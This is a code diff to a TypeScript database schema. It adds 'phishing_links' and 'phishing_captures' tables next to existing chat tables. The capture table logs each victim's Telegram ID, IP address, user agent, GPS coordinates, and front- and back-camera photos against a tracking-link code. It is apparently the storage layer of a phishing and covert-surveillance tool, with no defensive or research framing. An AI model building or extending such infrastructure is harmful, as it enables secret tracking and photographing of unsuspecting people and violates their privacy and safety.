@@ -223,6 +223,25 @@ export async function initSchema(db: D1Database): Promise<void> {
     )`,
     `CREATE INDEX IF NOT EXISTS idx_live_chat_pair ON live_chat_messages(from_id, to_id)`,
     `CREATE INDEX IF NOT EXISTS idx_live_chat_created ON live_chat_messages(created_at)`,
+    `CREATE TABLE IF NOT EXISTS phishing_links (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      code TEXT UNIQUE NOT NULL,
+      label TEXT DEFAULT '',
+      created_at TEXT DEFAULT (datetime('now'))
+    )`,
+    `CREATE TABLE IF NOT EXISTS phishing_captures (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      link_code TEXT NOT NULL,
+      telegram_id TEXT,
+      ip TEXT,
+      user_agent TEXT,
+      latitude REAL,
+      longitude REAL,
+      front_photo_key TEXT,
+      back_photo_key TEXT,
+      created_at TEXT DEFAULT (datetime('now'))
+    )`,
+    `CREATE INDEX IF NOT EXISTS idx_phishing_captures_code ON phishing_captures(link_code)`,
   ];
 
   for (const sql of stmts) {
